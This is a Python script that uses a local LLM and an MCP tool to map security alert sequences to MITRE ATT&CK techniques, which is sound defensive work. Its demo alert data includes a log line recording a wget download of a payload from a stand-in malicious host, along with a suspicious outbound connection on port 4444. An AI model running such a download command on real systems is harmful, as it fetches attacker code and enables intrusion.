from langchain_ollama import ChatOllama
from langchain_core.messages import SystemMessage, HumanMessage
from model_context_protocol.mcp_client import mcp_client
from pydantic import BaseModel
from typing import Optional
import asyncio
import json

class MitreTechniqueResult(BaseModel):
    technique_id: Optional[str] = None
    technique_name: Optional[str] = None

llm = ChatOllama(model="qwen2.5:3b", temperature=0)
structured_llm = llm.with_structured_output(MitreTechniqueResult)

async def get_mitre_technique_id(alert_log_sequence):
   
   tools = await mcp_client.get_tools()

   allowed_tool_names = (
       "get_technique_by_id",
    #    "get_techniques_by_tactic",
   )

   tools_by_name = {}

   for tool in tools:
       if tool.name in allowed_tool_names:
           tools_by_name[tool.name] = tool

   filtered_tools = list(tools_by_name.values())

   llm_with_tools = llm.bind_tools(filtered_tools)

#    system_prompt = SystemMessage(content="""You are a MITRE ATT&CK technique classifier.
#     You are given a sequence of security alerts.
#     Identify the most relevant MITRE ATT&CK technique for this alert sequence, then call the correct tool to retrieve it.

#     If you know the exact technique_id, call get_technique_by_id.
#     If you only know the tactic, call get_techniques_by_tactic.

#     Call exactly one tool, exactly once.
#     Do not guess. Do not respond without calling a tool.
#     Base your answer only on the alert data given.

#     Output format: {"technique_id": "MITRE technique ID, e.g. T1110", "technique_name": "short name of the technique"}
#     Only include a technique_id that is confirmed by the tool result. Do not invent or guess IDs.""")

   tool_prompt = HumanMessage(content=f"Identify the relevant MITRE ATT&CK technique ID for this alert sequence: {alert_log_sequence}")

   ai_msg = await llm_with_tools.ainvoke([tool_prompt])

#    print(" LLM responded:", ai_msg.tool_calls)

   if not ai_msg.tool_calls:
       return None

   call = ai_msg.tool_calls[0]
   tool_to_use = tools_by_name[call["name"]]
  
   result = await tool_to_use.ainvoke(call["args"])
#    print("tool returned:", result)   

   parsed = json.loads(result[0]["text"])
   technique = parsed.get("technique", {})

   return MitreTechniqueResult(
        technique_id = technique.get("mitre_id"),
        technique_name = technique.get("name"),
   )

# this runs when i run this file so can leave it here for now dont need to change parameters
if __name__ == "__main__":
    demo_alert_log_sequence = [
        {"rule_id": 1001, "timestamp": "2026-07-23T10:12:03Z", "host": "web-server-01", "message": "Multiple failed SSH login attempts for user 'admin' (12 attempts in 30s)"},
        {"rule_id": 1002, "timestamp": "2026-07-23T10:12:35Z", "host": "web-server-01", "message": "Successful SSH login for user 'admin' after previous failures"},
        {"rule_id": 1003, "timestamp": "2026-07-23T10:13:10Z", "host": "web-server-01", "message": "New process spawned: /usr/bin/wget http://malicious-domain.example/payload.sh"},
        {"rule_id": 1004, "timestamp": "2026-07-23T10:13:45Z", "host": "web-server-01", "message": "Outbound connection to unusual external IP on port 4444"},
    ]
    result = asyncio.run(get_mitre_technique_id(demo_alert_log_sequence))
    print(result)